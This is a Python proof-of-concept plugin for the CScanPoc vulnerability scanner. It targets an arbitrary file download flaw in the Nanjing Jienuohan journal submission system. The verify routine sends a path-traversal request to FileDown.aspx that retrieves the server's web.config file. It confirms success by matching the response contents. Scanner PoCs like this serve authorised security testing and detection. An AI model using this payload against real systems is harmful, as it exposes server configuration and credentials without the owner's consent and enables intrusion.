# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Jienuohan_0004'  # 平台漏洞编号，留空
    name = '南京杰诺瀚投稿系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        诺瀚投稿系统的设计者是具有博士学位的资深编辑，熟悉国内外投稿和审稿系统。 在逐一比较分析国内外采编系统的优缺点基础上，广泛汲取国内外各 系统的优 点，博采众家精华，提出设计思想和功能需求，由南京杰诺瀚科技的软件工程 师具体完成。
        南京杰诺瀚投稿系统任意文件下载。
        /IneduPortal/Components/news/FileDown.aspx
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '杰诺瀚投稿系统'  # 漏洞应用名称
    product_version = '南京杰诺瀚投稿系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6b90f546-82a0-413b-9342-8825c2559e86'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)

            if code == 200 and 'filename=web.config' in head and '<configSections>' in res:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
